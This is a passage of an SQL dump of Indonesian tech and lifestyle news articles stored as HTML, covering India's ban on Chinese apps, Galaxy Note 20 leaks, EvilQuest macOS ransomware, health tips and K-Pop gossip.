pernyataan dari warga mengenai keamanan data dan pelanggaran privasi yang berdampak pada ketertiban umum,\" tulis Kementerian Teknologi Informasi India melalui keterangan tertulis.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Lebih lanjut, Pemerintah India mengklaim bahwa langkah pemblokiran puluhan aplikasi tersebut dapat melindungi privasi dan keamanan data masyarakatnya. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Hal ini menjadi pukulan telak bagi TikTok. Sebab, India merupakan salah satu pasar dengan jumlah pengguna TikTok yang besar. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Pada akhir 2019 lalu, diperkirakan ada sebanyak 200 juta pengguna aktif TikTok setiap bulan di India. Sebelumnya, India juga sempat mempermasalahkan aplikasi telekonferensi Zoom. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Pada 16 April 2020 lalu, Pemerintah India membatasi penggunaan Zoom di negaranya karena alasan keamanan data. India bukan satu-satunya negara yang menentang peredaran aplikasi China pada negaranya. Beberapa negara seperti Taiwan dan Jerman diketahui juga sudah lebih dulu melakukan langkah serupa. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dirangkum KompasTekno dari India Today, Selasa (30/6/2020), berikut adalah daftar aplikasi asal China yang diblokir di wilayah India:</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- TikTok </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Mobile Legends </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Shareit </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Kwai </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- UC Browser </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Baidu map </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Shein </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Clash of Kings </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- DU battery saver </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Helo </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Likee </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- YouCam makeup </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Mi Community </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- CM Browers </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Virus Cleaner </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- APUS Browser </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- ROMWE </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Club Factory </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Newsdog </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Beutry Plus </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- WeChat </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- UC News </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- QQ Mail </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Weibo </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Xender </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- QQ Music </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- QQ Newsfeed </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Bigo Live </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- SelfieCity </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Mail Master </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Parallel Space </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Mi Video Call Xiaomi </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- WeSync </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- ES File Explorer </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Viva Video QU Video Inc </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Meitu </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Vigo Video </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- New Video Status </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- DU Recorder </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Vault </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Hide </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Cache Cleaner DU App studio </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- DU Cleaner </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- DU Browser </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Hago Play With New Friends </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Cam Scanner </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Clean Master Cheetah Mobile </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Wonder Camera </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Photo Wonder </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- QQ Player </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- We Meet </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Sweet Selfie </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Baidu Translate </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- Vmate </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- QQ International </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- QQ Security Center </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- QQ Launcher </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- U Video </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- V fly Status Video </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">- DU Privacy</span><br></p>', 'TikTok dan Mobile Legends Diblokir Pemerintah India, Mengapa?  Mari Simak Bersama-sama!', 'Minggu', '2020-07-07', '16:09:45', 'ml_dan_tik_tok_mstore_indonesia.jpg', 15, 'selebritis', 'Y'),
(666, 19, 'admin', 'Truk Pengangkut 200.000 iPhone Terguling dan Terbakar', '', 'https://youtu.be/fvZGYXf0dk4', 'truk-pengangkut-200000-iphone-terguling-dan-terbakar', 'N', 'Y', 'N', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Sebuah truk yang mengangkut sekitar 200.000 unit iPhone, terguling dan terbakar di China pada 23 Juni 2020 lalu. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kecelakaan tersebut terjadi di jalan tol dekat Nanjing, ibu kota Provinsi Jiangsu, di China Timur, yang berlokasi sekitar 300 kilometer dari Kota Shanghai. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dalam sebuah video yang beredar, posisi truk tersebut terguling dan menutup dua lajur jalan. Beberapa kendaraan lain yang melintas ikut terlibat dalam kecelakaan ini. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Tidak ada korban jiwa dalam kejadian, sebagaimana KompasTekno rangkum dari Auto Times News, Selasa (7/7/2020). Namun sebagian besar muatan truk, yakni ratusan iPhone, tidak terselamatkan. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dalam video, tumpukan boks iPhone yang diduga iPhone 11 series, varian warna hijau dan hitam, beberapa terlihat hangus, terbakar sebagian, atau rusak.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Polisi yang datang ke lokasi memastikan bahwa sebagian iPhone yang selamat, tidak dijarah pengguna jalan yang lewat. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Apple memang memastikan bahwa iPhone hasil jarahan akan dikunci dan tidak bisa digunakan. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Hal ini pernah terjadi beberapa waktu lalu, saat para demonstran yang memprotes kematian George Floyd di Minneapolis, Amerika Serikat awal Mei lalu, menjarah Apple Store di sana. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Mereka mengambil produk-produk Apple, mulai dari iPhone, iPad, dan MacBook. Segera, Apple mengunci perangkat-perangkat yang dicuri tadi menggunakan software, sehingga tidak bisa digunakan pencuri atau orang lain apabila dijual kembali. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dalam salah satu unggahan di Twitter, perangkat yang terkunci akan menampilkan pesan berbunyi \"silakan kembalikan ke Apple Walnut Street, perangkat ini telah dinonaktifkan dan sedang dilacak. Otoritas setempat akan disiagakan\".</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sistem operasi iOS di iPhone memang memiliki sistem keamanan yang akan mengunci perangkat apabila hilang atau dicuri. Itu artinya, saat berada di tangan pihak yang tidak berhak, Apple mengambil alih kendali untuk mengunci perangkat tersebut.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>\r\n', 'Truk Pengangkut 200.000 iPhone Terguling dan Terbakar di Luar Negeri', 'Sabtu', '2020-07-07', '13:53:46', 'iphone_mstore_indonesia.png', 9, 'teknologi', 'Y'),
(667, 19, 'admin', 'Samsung Galaxy Note 20 Disebut Meluncur 5 Agustus', '', 'https://www.youtube.com/watch?v=DsU2XY-JkbY', 'samsung-galaxy-note-20-disebut-meluncur-5-agustus', 'N', 'Y', 'N', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id -&nbsp; Bocoran mengenai Galaxy Note 20 series semakin banyak beredar di dunia maya. Ponsel flagship&nbsp;dari Samsung ini konon akan diperkenalkan bulan depan.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kabar ini muncul dari seorang pembocor ulung di Twitter. Akun @UniverseIce menyebut bahwa Galaxy Note 20 akan dirilis tepatnya tanggal 5 Agustus 2020. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Bocoran tanggal tersebut menjadi masuk akal apabila melihat riwayat peluncuran Galaxy Note series yang biasanya dilakukan pada awal bulan Agustus. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Tahun lalu, Samsung juga memerkenalkan Galaxy Note 10 dan Galaxy Note 10 Plus pada tanggal 7 Agustus 2019 di New York, Amerika Serikat.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kendati demikian, pihak Samsung sendiri belum memberikan pernyataan resmi terkait tanggal peluncuran tersebut, sehingga masih ada kemungkinan akan mundur atau bahkan lebih cepat. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Selain itu, konon sesi pre-order Galaxy Note 20 Series baru akan dimulai pada 27 Agustus 2020. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><b>Bocoran harga </b></span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sebelumnya, Samsung juga secara tidak sengaja memamerkan tampang Galaxy Note 20. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sebuah situs berita teknologi dari Yunani juga mengklaim telah mendapatkan informasi harga Galaxy Note 20 Series dari sumber terpercaya. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Menurut halaman Tech Maniac, di Eropa, Galaxy Note 20 reguler disebut akan dijual dengan harga 1,249 Euro (Rp 20,3 juta). Sedangkan Galaxy Note 20 Ultra akan dibanderol seharga 1,449 Euro (Rp 23,6 juta).</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sementara harga di Amerika Serikat cukup berbeda. Galaxy Note 20 Reguler (12 GB/128 GB) akan dijual seharga 1.199 US Dollar (Rp 17,2 juta).</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Kemudian Galaxy Note 20 Ultra kabarnya akan dibanderol 1.449 US Dollar (Rp 20,8 juta). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Berdasarkan kabar yang beredar sebelumnya, Samsung juga turut memperkenalkan sejumlah perangkat terbarunya di acara yang sama. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Beberapa perangkat tersebut yaitu Galaxy Z Flip 5G, Galaxy Tab S7/S7 Plus, Galaxy Watch 2, dan Galaxy Watch 3. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dihimpun KompasTekno dari Phone Arena, Selasa (7/7/2020), Galaxy Note 20 Reguler kabarnya akan mengusung layar AMOLED dengan diagonal sekitar 6,7 inci. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Adapun Galaxy Note 20 Ultra akan memakai panel yang sama namun ukurannya sedikit lebih besar, yaitu 6,9 inci.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Keduanya disinyalir masih akan mengusung desain Infinity-O seperti pendahulunya dan akan memiliki refresh rate hingga 120 Hz seperti trio Galaxy S20. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Untuk menunjang performa, Galaxy Note 20 series disinyalir bakal ditenagai dengan chipset Exynos 992 dan Snapdragon 865. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Meski begitu, informasi di atas belum bisa dipastikan kebenarannya. Samsung pun belum mengonfirmasi kapan tanggal peluncuran akan diselenggarakan. Kita tunggu saja.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span></p>\r\n', 'Samsung Galaxy Note 20 Disebut Meluncur Kemungkinan Pada 5 Agustus', 'Sabtu', '2020-07-07', '13:49:09', 'samsung_s20_mstore_indonesia.jpg', 15, 'teknologi', 'Y'),
(668, 41, 'admin', 'ROBOT Kecil Cikal Bakal Transformer segera relase untuk anak', '', '', 'robot-kecil-cikal-bakal-transformer-segera-relase-untuk-anak', 'N', 'Y', 'Y', '<p>Anda penyuka Transformer? Tentu hal yang paling menarik saat menonton film Transformer salah satunya adalah saat adegan transformasi yang begitu keren dari sebuah mobil atau truk menjadi robot yang gagah. Nah tapi jangan pernah berpikir kalau Transformer tidak mungkin terwujud di masa depan karena banyak film fiksi yang menjadi non fiksi berkat kecanggihan teknologi. Nah kali ini ada robot kecil yang mampu menampilkan kemampuan berubah diri dengan konsep lipatan karena terinspirasi dari ORIGAMI (seni melipat kertas Jepang) dan proses biologi.</p>\r\n\r\n<p>Walau robot yang Anda lihat ini bukan seperti robot keren seperti Transformer tapi robot origami hasil ciptaan periset dari MIT dan Harvard ini mampu merubah bentuk dari robot yang &ldquo;datar&rdquo; seperti kertas menjadi bentuk aslinya dengan empat kaki yang bisa berjalan.</p>\r\n\r\n<p>Desain robot ini juga terpinspirasi dari proses biologi seperti bagaimana amino acid membentuk protein dari struktur datar menjadi coil tiga dimensi.</p>\r\n\r\n<p>Robot ini memulai berubah bentuk saat panas diaplikasikan pada &ldquo; Shrinky dinks&rdquo; (nama material yang digunakan) sebagai bagian dari materi kertas komposit yang digunakan pada tubuh robot ini. Memang tampilan robot ini sangat sederhana dan tidak menarik karena memang robot ini menggunakan bahan yang sangat murah dan mereka ingin menghasilkan prototipe pertama untuk konsep transformasi robot yang mereka pikirkan dalam waktu yang singkat.</p>\r\n', '', 'Minggu', '2018-04-22', '07:35:07', 'Transformers.jpg', 24, 'teknologi', 'Y'),
(669, 31, 'admin', '5 Buah Penangkal Racun dalam Tubuh', '', '', '5-buah-penangkal-racun-dalam-tubuh', 'N', 'Y', 'N', '<p>Setiap hari tubuh memproduksi racun yang berasal dari udara yang dihirup dan makanan yang dikonsumsi. Akhirnya, racun pun memengaruhi kesehatan kita. Kulit mengalami kerusakan, pencernaan yang bermasalah, sampai ketidakseimbangan hormon, merupakan akibat dari racun yang ada di dalam tubuh.<br />\r\n<br />\r\nMaka itu, untuk membersihkan racun-racun dalam tubuh (detoksifikasi), dianjurkan untuk mengonsumsi beberapa jenis buah yang memiliki peran besar untuk hal ini.&nbsp;<br />\r\n<br />\r\nLemon kaya akan vitamin C, yang membantuh tubuh memproduksi glutation. Glutation adalah antioksidan yang membantu membuang racun yang ada di hati. Minum air lemon setiap hari, membantu mendetoksifikasi hati Anda. Selain sistem kekebalan yang baik, pencernaan pun turut merasakan manfaatnya.</p>\r\n\r\n<p>Buah nanas tidak hanya mengandung vitamin C, tapi juga mengandung enzim bromelain. Enzim ini dapat menenangkan dan membersihkan usus dari racun. Hal ini juga dikenal sebagai anti-inflamasi yang kuat, yang dapat membantu mengurangi rasa sakit akibat peradangan.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', 'Minggu', '2018-04-22', '07:28:10', 'buah_penangkal.jpg', 5, 'kesehatan', 'Y'),
(670, 31, 'admin', '7 Efek Buruk dari Konsumsi Obat Tidur', '', '', '7-efek-buruk-dari-konsumsi-obat-tidur', 'N', 'Y', 'N', '<p>Konsumsi obat tidur kerap dipilih bagi mereka yang mengalami kesulitan tidur atau insomnia. Mereka berpikir bahwa obat tidur mampu memberikan apa yang diinginkan, yaitu tidur dengan lelap. Namun kenyataannya, obat tidur tidak dapat mengobati kondisi tersebut, bahkan hanya memperburuk masalah saja.&nbsp;<br />\r\n<br />\r\nDi bawah ini beberapa jenis masalah terkait dengan pil tidur dan penggunaan yang terlalu berlebihan, seperti dikutip&nbsp;<em>Health Me Up</em>, Senin (11/8/2014):</p>\r\n\r\n<p>1. Efek samping dari obat tidur dapat membuat orang yang meminumnya merasa lupa, merasa pusing, bingung, dan sulit untuk berpikir keesokan harinya.</p>\r\n\r\n<p>2. Berlebihan dalam mengonsumsinya, akan memaksa Anda untuk meningkatkan asupannya agar Anda benar-benar tertidur. Sudah jelas, akan menimbulkan efek samping yang lebih besar.</p>\r\n\r\n<p>3. Terlalu sering mengonsumsi obat tidur akan membuat Anda ketergantungan yang berkepanjangan. Tidur lelap secara alami, tampaknya hanya mimpi yang jauh dari angan, yang hanya akan membuat Anda mengalami sulit tidur dan kerap merasa cemas.</p>\r\n\r\n<p>4. Jika Anda berhenti mengonsumsinya, secara perlahan tubuh akan menggigil, berkeringat, dan mual.</p>\r\n\r\n<p>5. Anda harus tahu bahwa obat tidur akan memengaruhi proses dari obat jenis lainnya yang sedang Anda konsumsi. Apakah itu obat pusing, demam, dan lain-lain.</p>\r\n\r\n<p>6. Kondisi akan semakin parah, saat Anda menggabungkannya dengan obat penghilang rasa sakit atau obat penenang.</p>\r\n\r\n<p>7. Anda harus menyadari bahwa masalah tidur mungkin menjadi pemicu terjadinya beberapa penyakit kesehatan mental, yang mendasari terjadinya gangguan tidur. Dan obat tidak selalu menjadi pilihan yang tepat.</p>\r\n', '', 'Minggu', '2018-04-22', '07:27:03', 'obat.png', 9, 'kesehatan', 'Y'),
(671, 23, 'mstore', 'Hati-hati, Ransomware Baru Mulai Menyerang MacOS', '', 'https://www.youtube.com/watch?v=VgEyt5_Jc8I', 'hatihati-ransomware-baru-mulai-menyerang-macos', 'N', 'Y', 'Y', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Masih ingat dengan WannaCry? Ransomware ini sempat menghebohkan dunia maya pada 2017 lalu. Perangkat lunak jahat ini dapat mengunci data-data milik pengguna. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kini serangan virus penyandera data ini kembali ditemukan. Serangan ini secara spesifik menargetkan perangkat Apple berbasis sistem operasi MacOS. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Ransomware baru bernama EvilQuest, tersebut dapat mengenkripsi file dan menyebabkan beberapa masalah pada sistem operasi. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Menurut laporan dari perusahaan antivirus Malwarebytes, EvilQuest dibawa oleh sebuah aplikasi MacOS bajakan. Sebuah kode berbahaya ditemukan di aplikasi salinan \"Little Snitch\" yang kemungkinan telah dimodifikasi sebelumnya. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Salinan aplikasi ini, diunduh melalui tautan torrent yang ditemukan di sebuah forum berbahasa Rusia. Sebenarnya, aplikasi Little Snitch yang aman memang tersedia secara legal. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Aplikasi tersebut hanya berjalan di perangkat MacOS. Namun, aplikasi Little Snitch bajakan turut membawa file berupa PKG installer yang biasa digunakan untuk menginstal sebuah program software.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Setelah menganalisis file PKG ini, Malwarebytes menemukan bahwa aplikasi tersebut memiliki \"postintal script\", yang biasanya digunakan untuk membersihkan pemasangan setelah proses instalasi dilakukan. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dalam kasus ini, skrip tersebut menempelkan malware di MacOS. File skrip ini disalin dan disembunyikan ke sebuah folder bernama \"CrashReporter\" yang terhubung ke aplikasi Little Snitch.&nbsp;Lokasi tepatnya adalah di /Library/LittleSnitchd/CrashReporter. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dengan demikian, pengguna tidak akan mudah mengetahui bahwa aplikasi tersebut ada di Acitivity Monitor, sebab MacOS juga memiliki aplikasi dengan nama serupa. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Menurut Malwarebytes, ransomware ini baru akan memulai aksinya setelah beberapa waktu terinstal di perangkat.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sehingga pengguna tidak lekas menyadari bahwa masalah yang terjadi disebabkan oleh aplikasi Little Snitch bajakan. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Setelah kode berbahaya tadi aktif, kode tersebut akan memodifikasi sistem dan file pengguna dengan enkripsi yang tidak diketahui. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Enkripsi ini membuat fitur Finder di Mac tidak bekerja dengan baik dan sistem akan sering mengalami crash. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Bahkan sistem Keychain juga ikut dirusak, menyebabkan pengguna tidak bisa mengakses password dan sertifikat yang disimpan di dalam Mac. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dalam sebuah pesan yang muncul di layar, peretas meminta tebusan sebesar 50 dollar AS (sekitar Rp 724.000) jika ingin mendapatkan file mereka kembali. Apabila tidak dipenuhi, peretas mengancam akan menghapus seluruh file dalam tiga hari. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dirangkum KompasTekno dari 9to5mac, Jumat (3/7/2020), hingga saat ini belum ada cara yang bisa dilakukan untuk menghapus malware tersebut. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Hanya ada satu cara yang kemungkinan berhasil, yakni memformat seluruh disk. Ada baiknya pengguna melakukan backup (pencadangan) file yang ada di Mac. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Simpan setidaknya dua salinan data penting dan salah satunya, tidak boleh disimpan di dalam Mac setiap saat,\" tulis Malwarebytes dalam situsnya.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sebab, ransomware masih berpeluang untuk mengenkripsi atau merusak file cadangan yang terhubung ke drive.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>\r\n', 'Hati-hati, Ransomware Baru Mulai Menyerang MacOS, Hati hati yaa para Mac User!', 'Minggu', '2020-07-07', '16:08:00', 'virus_mstore_indonesia.png', 5, 'selebritis', 'Y');
INSERT INTO `berita` (`id_berita`, `id_kategori`, `username`, `judul`, `sub_judul`, `youtube`, `judul_seo`, `headline`, `aktif`, `utama`, `isi_berita`, `keterangan_gambar`, `hari`, `tanggal`, `jam`, `gambar`, `dibaca`, `tag`, `status`) VALUES
(672, 2, 'admin', '3 Cewek K-Pop Paling Hot Jalan Bersama', '', '', '3-cewek-kpop-paling-hot-jalan-bersama', 'N', 'Y', 'Y', '<p>Sudah banyak line seangkatan yang jadi perbincangan pecinta K-Pop. Tiap line punya keunikam masing-masing karena berisi artis idola dari boyband atau girlband populer.&nbsp;</p>\r\n\r\n<p>Tapi dari sekian pertemuan &nbsp;istimewa sesama idola, pertemuan 3 idola paling &quot;panas&quot; di industri hiburan K-Pop ini layak jadi pembicaraan. Ya, Soyu &quot;SISTAR&quot;, Min &quot;Miss A&quot;, dan Nicole eks. &quot;KARA&quot; secara mengejutkan &nbsp;memperlihatkan persahabatan<br />\r\nmereka.</p>\r\n\r\n<p>Min yang membocorkan pertemuan itu lewat akun Instagramnya, Rabu (6/8). Min mengunggah foto mereka bertiga sedang hangout bareng. Meski tak ada komentar, bukti foto adalah segalahnya. Dalam foto tampak mereka melakukan selfie saat sedang hangout bareng.&nbsp;</p>\r\n\r\n<p>Ketiganya saat ini sedang sibuk-sibuknya. Min tengah mempersiapkan konser JYP Nation, ONE MIC, Nicole tengah bertlatih untuk karier solonya, sedang Soyu sedang mempromosikan single baru SISTAR, Touch My Body. Min dan Nicole dikenal sebagai line &#39;91, namun selama ini diketahui paling akrab dengan Key &quot;SHINee&quot; dam Jinwoon &quot;2AM&quot;.&nbsp;</p>\r\n\r\n<p>Sedang Soyu sendiri saat ini anggota girlband paling sukses dengan single solonya. Menarik melihat pertemuan-pertemuan geng baru cewek ini.&nbsp;</p>\r\n', '', 'Minggu', '2018-04-22', 